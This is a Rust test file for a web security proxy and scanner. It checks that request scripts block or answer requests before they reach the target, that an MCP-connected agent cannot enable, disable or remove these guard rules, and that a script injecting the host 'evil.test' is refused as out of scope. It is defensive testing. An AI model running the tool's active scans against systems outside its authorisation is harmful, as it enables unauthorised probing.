        let rows = env.rows(&format!("SELECT path, status, error, edited_by FROM history WHERE source = 'fuzz' AND path LIKE '%/{store}' ORDER BY path"));
        let answered =
            rows.iter().find(|r| r[0] == format!("/answered/{store}")).unwrap_or_else(|| panic!("{store}: {rows:?}"));
        assert_eq!(answered[1], 200, "{store}: {rows:?}");
        assert!(answered[3].as_str().unwrap().contains("answered"), "{store}: {rows:?}");
        if store == "all" {
            let blocked = rows.iter().find(|r| r[0] == "/blocked/all").unwrap();
            assert!(blocked[2].as_str().unwrap().contains("not on fuzz"), "{rows:?}");
        }
    }

    untouched("fuzz");
    // An active scan: the answers are on record, and no scan rule judges them.
    // A URL's baseline answered by the script is on record and not attacked.
    let scan_url = format!("http://127.0.0.1:{port}/answered/scan?q=1");
    let (code, v) = env.run(&["scan", "active", &scan_url, "--strength", "low", "-c", "1"]);
    assert_eq!((code, v["error"]["kind"].as_str()), (7, Some("blocked")), "{v}");
    assert_eq!(env.rows("SELECT count(*) FROM history WHERE source = 'scan'")[0][0], 1);
    untouched("scan baseline");
    // Attacks on a recorded request: each is answered or blocked, none sent, nothing concluded;
    // a probe's raw connection (which no script could see) isn't made either.
    // A row the script answered is no baseline.
    let answered =
        env.rows("SELECT id FROM history WHERE source = 'send' AND path = '/answered/send'")[0][0].to_string();
    let (code, v) = env.run(&["scan", "active", "--history-id", &answered, "--strength", "low", "-c", "1"]);
    assert_eq!((code, v["error"]["kind"].as_str()), (7, Some("blocked")), "{v}");
    assert!(v["error"]["message"].as_str().unwrap().contains("no baseline"), "{v}");
    // A recorded exchange (written here, so the target is never asked) is attacked.
    let base = {
        use brainproxy_core::{capture::Capture, http::Target, store::Store};
        let target = Target { scheme: "http".into(), host: "127.0.0.1".into(), port };
        let req = format!("GET /answered/base?q=1 HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\n\r\n");
        let resp = b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: 2\r\n\r\nok";
        let c = Capture::new("proxy", &target, req.as_bytes(), Some(resp), Some(1), None);
        Store::open(&env.project).unwrap().record(&c).unwrap().to_string()
    };
    let (code, v) = env.run(&["scan", "active", "--history-id", &base, "--strength", "low", "-c", "1"]);
    assert!(env.rows("SELECT count(*) FROM history WHERE source = 'scan'")[0][0].as_i64().unwrap() > 1, "{code} {v}");
    assert_eq!(env.rows("SELECT count(*) FROM findings WHERE source = 'active'")[0][0], 0, "{v}");
    untouched("scan");
    // An API scan's baselines go through the script too: none is sent.
    let spec = env.script(
        "api.json",
        &json!({
            "openapi": "3.0.0", "info": {"title": "t", "version": "1"},
            "servers": [{"url": format!("http://127.0.0.1:{port}")}],
            "paths": {"/blocked/api": {"get": {"responses": {"200": {"description": "ok"}}}},
                      "/answered/api": {"get": {"responses": {"200": {"description": "ok"}}}}},
        })
        .to_string(),
    );
    let (code, v) = env.run(&["scan", "active", "--api", &spec, "--strength", "low", "-c", "1"]);
    assert_ne!(code, 0, "{v}");
    let rows = env.rows("SELECT path, edited_by FROM history WHERE path LIKE '%/api' ORDER BY path");
    assert_eq!(rows.len(), 2, "{rows:?}");
    assert!(rows.iter().all(|r| r[1].as_str().is_some_and(|e| e.contains("outcome"))), "{rows:?}");
    // The answered one went through the scan's response rules as a server's response would.
    let ruled = env.rows(
        "SELECT count(*) FROM rule_edits e JOIN history h ON h.id = e.history_id \
         WHERE h.path = '/answered/api' AND instr(e.modified_response, 'X-Ruled: yes') > 0",
    );
    assert_eq!(ruled[0][0], 1, "{ruled:?}");
    untouched("scan --api");

    // Passive checks read a script's response, and every finding raised from it says it is the
    // script's: an alert type of its own, a name, a description, a tag and other info that say so.
    env.ok(&["scan", "passive", "--rescan"]);
    let found = env.rows(
        "SELECT f.alert_ref, f.name, f.other_info, t.description, t.tags, f.rule_id, f.id FROM findings f \
         JOIN history h ON h.id = f.history_id JOIN finding_types t ON t.alert_ref = f.alert_ref \
         WHERE h.edited_by LIKE '%answered%'",
    );
    assert!(!found.is_empty(), "the made-up page has missing headers to find");
    for f in &found {
        assert!(f[0].as_str().unwrap().starts_with("script-answer:"), "{f:?}");
        assert!(f[1].as_str().unwrap().ends_with("(in a script's answer, not the target's)"), "{f:?}");
        assert!(f[2].as_str().unwrap().contains("the script of match-and-replace rule 1 made up"), "{f:?}");
        assert!(
            f[3].as_str().unwrap().starts_with("Found in a response that a request rule's script made up"),
            "{f:?}"
        );
        assert!(f[4].as_str().unwrap().contains("script-answer"), "{f:?}");
        // Filed under its rule's id, which a retest refuses: the target's answer says nothing of it.
        assert_ne!(f[5], 0, "{f:?}");
    }
    let e = env.refused(&[], &["findings", "retest", &found[0][6].to_string()], None);
    assert!(e.contains("raised from a request rule's script's answer"), "{e}");
    // None of them is one with a finding of the target's: no finding lacks the mark there.
    let plain = env.rows(
        "SELECT count(*) FROM findings f JOIN history h ON h.id IN (f.history_id, f.last_history_id) \
         WHERE h.edited_by LIKE '%answered%' AND f.alert_ref NOT LIKE 'script-answer:%'",
    );
    assert_eq!(plain[0][0], 0, "{plain:?}");
    let listed = env.ok(&["findings", "list"]);
    assert!(listed.to_string().contains("(in a script's answer, not the target's)"), "{listed}");
    // A passive check tried on an answered row says the same.
    let check =
        env.script("title.js", "function check(x) { return { name: 'Title seen', evidence: x.response.body }; }");
    let answered = env.rows("SELECT id FROM history WHERE path = '/answered' AND source = 'proxy'")[0][0].to_string();
    let tried = env.ok(&["scan", "script", "test", &check, "--history", &answered]);
    assert!(tried.to_string().contains("Title seen (in a script's answer, not the target's)"), "{tried}");
    let shown = env.ok(&["history", "list", "--limit", "1"]);
    assert!(shown["items"][0]["edited_by"].to_string().contains("outcome"), "{shown}");
}

#[test]
fn a_request_script_is_a_persons_and_is_pinned_like_any_script() {
    let port = serve();
    let env = Env::new("stops-mcp");
    let agent = [(MCP, "1")];
    let script = env.script("stops.js", STOPS);
    let why = "runs code from a file, so it isn't offered through MCP";
    let e = env.refused(
        &agent,
        &["rules", "add", "--location", "request", "--script", &script, "--applies-to", "send"],
        None,
    );
    assert!(e.contains(why), "{e}");
    let e = env.refused(
        &agent,
        &["rules", "test", "-", "--location", "request", "--script", &script],
        Some(b"GET / HTTP/1.1\r\n\r\n"),
    );
    assert!(e.contains(why), "{e}");
    // A request rule takes nothing but its script.
    let no = env.refused(&[], &["rules", "add", "--location", "request", "--match", "x", "--script", &script], None);
    assert!(no.contains("takes no --match"), "{no}");
    let no = env.refused(&[], &["rules", "add", "--location", "request", "--replace", "x"], None);
    assert!(no.contains("is a script"), "{no}");
    let replacer = env.script("replace.js", "function replace(m) { return m.text; }");
    let no = env.refused(&[], &["rules", "add", "--location", "request", "--script", &replacer], None);
    assert!(no.contains("it defines no request function"), "{no}");

    // A person's rule, added disabled: an agent can't turn it on.
    env.ok(&["rules", "add", "--location", "request", "--script", &script, "--applies-to", "send", "--disabled"]);
    assert!(env.refused(&agent, &["rules", "enable", "1"], None).contains(why));
    env.ok(&["rules", "enable", "1"]);
    // Nor switch it off or remove it: it may be what keeps requests from the target.
    let guard = "isn't switched off or removed through MCP";
    for args in [&["rules", "disable", "1"][..], &["rules", "remove", "1"], &["rules", "clear"]] {
        assert!(env.refused(&agent, args, None).contains(guard), "{args:?}");
    }
    assert!(env.refused(&agent, &["rules", "import", "-", "--replace"], Some(b"[]")).contains(guard));
    assert_eq!(env.ok(&["rules", "list"])["rules"][0]["enabled"], true);
    // rules test says what the engine would do, sending nothing.
    let tried =
        env.ok_stdin(&["rules", "test", "-", "--as", "send"], b"GET /answered HTTP/1.1\r\nHost: h.test\r\n\r\n");
    assert_eq!(tried["request"]["stopped"]["outcome"], "answered", "{tried}");
    let tried = env.ok_stdin(&["rules", "test", "-", "--as", "send"], b"GET /blocked HTTP/1.1\r\nHost: h.test\r\n\r\n");
    assert_eq!(tried["request"]["stopped"]["outcome"], "blocked", "{tried}");

    // The file changes: the rule is skipped, and the request goes out as any would.
    std::fs::write(&script, "function request() { return { block: 'changed' }; }").unwrap();
    let listed = env.ok(&["rules", "list"]);
    assert!(listed["skipped"][0]["reason"].as_str().unwrap().contains("changed since it was named"), "{listed}");
    let sent = env.ok(&["send", "--url", &format!("http://127.0.0.1:{port}/blocked")]);
    assert_eq!(sent["response"]["status"], 403, "{sent}");
    assert!(sent.get("answered_by").is_none(), "{sent}");
}

#[test]
fn a_failing_request_script_sends_the_request_and_says_so() {
    let port = serve();
    let env = Env::new("stops-fail");
    let script = env.script("bad.js", "function request(req) { return { response: { status: 101 } }; }");
    env.ok(&["rules", "add", "--location", "request", "--script", &script, "--applies-to", "send"]);
    let sent = env.ok(&["send", "--url", &format!("http://127.0.0.1:{port}/a")]);
    assert_eq!(sent["response"]["status"], 403, "the target answered: {sent}");
    assert!(sent["rule_errors"][0]["error"].as_str().unwrap().contains("a code from 200 to 999"), "{sent}");
    let failures = env.ok(&["rules", "list"])["failures"].clone();
    assert_eq!(failures[0]["engine"], "send", "{failures}");
}

#[test]
fn a_request_scripts_rewrite_goes_to_scan_baselines_and_meets_the_host_check() {
    // Answers every request 200, and keeps each request line it got.
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    let lines = std::sync::Arc::new(std::sync::Mutex::new(Vec::<String>::new()));
    let seen = lines.clone();
    std::thread::spawn(move || {
        for stream in listener.incoming() {
            let Ok(mut s) = stream else { continue };
            let seen = seen.clone();
            std::thread::spawn(move || {
                let mut buf = vec![0u8; 65536];
                let mut len = 0;
                while !buf[..len].windows(4).any(|w| w == b"\r\n\r\n") {
                    match s.read(&mut buf[len..]) {
                        Ok(0) | Err(_) => return,
                        Ok(n) => len += n,
                    }
                }
                let line = String::from_utf8_lossy(&buf[..len]).lines().next().unwrap_or("").to_string();
                seen.lock().unwrap().push(line);
                let _ = s.write_all(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nok");
            });
        }
    });
    let env = Env::new("stops-rewrite");
    let script = env.script(
        "rewrite.js",
        "function request(req) {
            if (req.path.startsWith('/danger')) return { request: { ...req, path: '/safe' } };
            if (req.path === '/elsewhere') return { request: { headers: [['Host', 'evil.test']] } };
        }",
    );
    env.ok(&["rules", "add", "--location", "request", "--script", &script, "--applies-to", "send,scan"]);
    // A scan's baseline goes as the script rewrote it, as its attacks do.
    let _ =
        env.run(&["scan", "active", &format!("http://127.0.0.1:{port}/danger?q=1"), "--strength", "low", "-c", "1"]);
    let got = lines.lock().unwrap().clone();
    assert!(got.iter().any(|l| l.starts_with("GET /safe")), "{got:?}");
    assert!(!got.iter().any(|l| l.contains("/danger")), "{got:?}");
    // The baseline's row says the script changed it.
    let baseline = env.rows("SELECT path, edited_by FROM history WHERE source = 'scan' ORDER BY id LIMIT 1");
    assert_eq!(baseline[0][0], "/safe", "{baseline:?}");
    assert!(baseline[0][1].as_str().is_some_and(|e| e.contains("\"rule\":1")), "{baseline:?}");
    // A host the scope doesn't list that the script brought in isn't sent: nobody checked it.
    let (code, v) = env.run(&["send", "--url", &format!("http://127.0.0.1:{port}/elsewhere")]);
    assert_eq!((code, v["error"]["kind"].as_str()), (6, Some("out_of_scope")), "{v}");
    assert!(v["error"]["message"].as_str().unwrap().contains("the script of request rule 1 put a host"), "{v}");
}

#[test]
fn an_api_scan_attacks_from_the_request_before_the_script() {
    // Answers every request 200, and keeps each request line it got.
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    let lines = std::sync::Arc::new(std::sync::Mutex::new(Vec::<String>::new()));
    let seen = lines.clone();
    std::thread::spawn(move || {
        for stream in listener.incoming() {
            let Ok(mut s) = stream else { continue };
            let seen = seen.clone();
            std::thread::spawn(move || {
                let mut buf = vec![0u8; 65536];
                let mut len = 0;
                while !buf[..len].windows(4).any(|w| w == b"\r\n\r\n") {
                    match s.read(&mut buf[len..]) {
                        Ok(0) | Err(_) => return,
                        Ok(n) => len += n,
                    }
                }
                seen.lock()
                    .unwrap()
                    .push(String::from_utf8_lossy(&buf[..len]).lines().next().unwrap_or("").to_string());
                let _ = s.write_all(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nok");
            });
        }
    });
    let env = Env::new("stops-api");
    // Not idempotent: applied twice, it would say so in the path.
    let script = env
        .script("prefix.js", "function request(req) { return { request: { ...req, path: '/prefix' + req.path } }; }");
    env.ok(&["rules", "add", "--location", "request", "--script", &script, "--applies-to", "scan"]);
    let spec = env.script(
        "api.json",
        &json!({
            "openapi": "3.0.0", "info": {"title": "t", "version": "1"},
            "servers": [{"url": format!("http://127.0.0.1:{port}")}],
            "paths": {"/item": {"get": {"parameters": [{"name": "q", "in": "query", "schema": {"type": "string"}}],
                                        "responses": {"200": {"description": "ok"}}}}},
        })
        .to_string(),
    );
    let _ = env.run(&["scan", "active", "--api", &spec, "--strength", "low", "-c", "1"]);
    let got = lines.lock().unwrap().clone();
    assert!(got.iter().any(|l| l.starts_with("GET /prefix/item")), "{got:?}");
    assert!(!got.iter().any(|l| l.contains("/prefix/prefix")), "{got:?}");
}

/// A target that answers `200 OK` with the request it got as the body, and keeps each request
/// line it got.
fn recording() -> (u16, std::sync::Arc<std::sync::Mutex<Vec<String>>>) {
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    let lines = std::sync::Arc::new(std::sync::Mutex::new(Vec::<String>::new()));
    let seen = lines.clone();
    std::thread::spawn(move || {
        for stream in listener.incoming() {
            let Ok(mut s) = stream else { continue };
            let seen = seen.clone();
            std::thread::spawn(move || {
                let mut buf = vec![0u8; 16384];
                let mut len = 0;
                while !buf[..len].windows(4).any(|w| w == b"\r\n\r\n") {
                    match s.read(&mut buf[len..]) {
                        Ok(0) | Err(_) => return,
                        Ok(n) => len += n,
                    }
                }
                let line = String::from_utf8_lossy(&buf[..len]).lines().next().unwrap_or("").to_string();
                seen.lock().unwrap().push(line);
                let head = format!("HTTP/1.1 200 OK\r\nContent-Length: {len}\r\nConnection: close\r\n\r\n");
                let _ = s.write_all(head.as_bytes());
                let _ = s.write_all(&buf[..len]);
            });
        }
    });
    (port, lines)
}

/// Blocks `/admin`, answers `/answered`, and marks every other request with one more `x` in
/// `X-Runs` each time it sees it.
const GATE: &str = "function request(req) {
    if (req.path.startsWith('/admin')) return { block: 'no admin' };
    if (req.path.startsWith('/answered')) return { response: { status: 200, body: 'from the script' } };
    const runs = req.headers.find(h => h[0] === 'X-Runs');
    const rest = req.headers.filter(h => h[0] !== 'X-Runs');
    return { request: { ...req, headers: rest.concat([['X-Runs', runs ? runs[1] + ' x' : 'x']]) } };
}";

#[test]
fn a_request_edited_in_intercept_goes_through_the_request_scripts_again() {
    let (port, lines) = recording();
    let env = Env::new("intercept-rescript");
    let script = env.script("gate.js", GATE);
    env.ok(&["rules", "add", "--location", "request", "--script", &script]);
    // A plain rule had its turn before the request was held: it isn't applied again to the edit.
    env.ok(&["rules", "add", "--location", "request-header", "--name", "X-Plain", "--action", "add", "--replace", "1"]);
    env.ok(&["intercept", "enable", "--timeout", "30"]);
    let listen = env.ok(&["proxy", "start", "--listen", "127.0.0.1:0"])["listen"].as_str().unwrap().to_string();
    wait_for_settings();
    let agent = [(MCP, "1")];

    // Held as the rules left it, then forwarded by `forward` (edit in hand, or none).
    let held_then = |path: &str, forward: &dyn Fn(&str, &str)| {
        let (listen, target) = (listen.clone(), path.to_string());
        let client = std::thread::spawn(move || through(&listen, port, &target, ""));
        let listed = env.ok(&["intercept", "list", "--wait", "10"]);
        assert_eq!(listed["count"], 1, "{listed}");
        let id = listed["items"][0]["id"].as_i64().unwrap().to_string();
        let held = env.ok(&["intercept", "show", &id])["message"]["content"].as_str().unwrap().to_string();
        assert!(held.contains("\r\nX-Runs: x\r\n") && held.contains("\r\nX-Plain: 1\r\n"), "{held}");
        forward(&id, &held);
        client.join().unwrap()
    };

    // An agent turns the allowed /safe into /admin: the script blocks it, and nothing is sent.
    let resp = held_then("/safe", &|id, held| {
        let edit = held.replace("GET /safe", "GET /admin");
        let (code, v) = env.run_as(&agent, &["intercept", "forward", id, "--file", "-"], Some(edit.as_bytes()));
        assert_eq!(code, 0, "{v}");
    });
    assert!(resp.starts_with("HTTP/1.1 403 Forbidden\r\n") && resp.contains("X-Brainproxy-Error: blocked"), "{resp}");
    assert!(resp.contains("blocked by the script of match-and-replace rule 1: no admin"), "{resp}");
    env.wait_rows("SELECT count(*) FROM history WHERE source = 'proxy'", 1);
    let rows = env.rows("SELECT path, status, error, edited_by FROM history WHERE source = 'proxy' ORDER BY id");
    assert_eq!((rows[0][0].as_str(), &rows[0][1]), (Some("/admin"), &Value::Null), "{rows:?}");
    assert!(rows[0][2].as_str().unwrap().contains("no admin"), "{rows:?}");
    let by: Value = serde_json::from_str(rows[0][3].as_str().unwrap()).unwrap();
    let by = by.as_array().unwrap();
    assert!(by.iter().any(|e| e["by"] == "mcp" && e["intercept"].is_number()), "{by:?}");
    assert_eq!(by.last().unwrap()["outcome"], "blocked", "{by:?}");

    // Edited to /answered: the client gets the script's answer, and the row says so.
    let resp = held_then("/safe", &|id, held| {
        let edit = env.dir.join("answered.http");
        std::fs::write(&edit, held.replace("GET /safe", "GET /answered")).unwrap();
        env.ok(&["intercept", "forward", id, "--file", edit.to_str().unwrap()]);
    });
    assert!(resp.starts_with("HTTP/1.1 200 OK\r\n") && resp.ends_with("from the script"), "{resp}");
    assert!(resp.contains("X-Brainproxy-Answer: rule 1"), "{resp}");
    env.wait_rows("SELECT count(*) FROM history WHERE source = 'proxy'", 2);
    let by = env.rows("SELECT edited_by FROM history WHERE source = 'proxy' ORDER BY id DESC LIMIT 1");
    let by: Value = serde_json::from_str(by[0][0].as_str().unwrap()).unwrap();
    assert_eq!(by.as_array().unwrap().last().unwrap()["outcome"], "answered", "{by}");
    assert!(lines.lock().unwrap().is_empty(), "the target was reached: {:?}", lines.lock().unwrap());

    // Edited to /other, which the script allows: sent as the script left it (it saw the edit),
    // and the plain rule isn't applied a second time.
    let resp = held_then("/safe", &|id, held| {
        let edit = held.replace("GET /safe", "GET /other");
        let (code, v) = env.run_as(&agent, &["intercept", "forward", id, "--file", "-"], Some(edit.as_bytes()));
        assert_eq!(code, 0, "{v}");
    });
    assert!(resp.starts_with("HTTP/1.1 200 OK\r\n"), "{resp}");
    assert!(resp.contains("GET /other HTTP/1.1\r\n") && resp.contains("\r\nX-Runs: x x\r\n"), "{resp}");
    assert_eq!(resp.matches("X-Plain: 1").count(), 1, "{resp}");

    // Forwarded as held: the script has seen it already, and isn't run again.
    let resp = held_then("/safe", &|id, _| {
        env.ok(&["intercept", "forward", id]);
    });
    assert!(resp.contains("GET /safe HTTP/1.1\r\n") && resp.contains("\r\nX-Runs: x\r\n"), "{resp}");
    assert_eq!(*lines.lock().unwrap(), ["GET /other HTTP/1.1", "GET /safe HTTP/1.1"]);
}
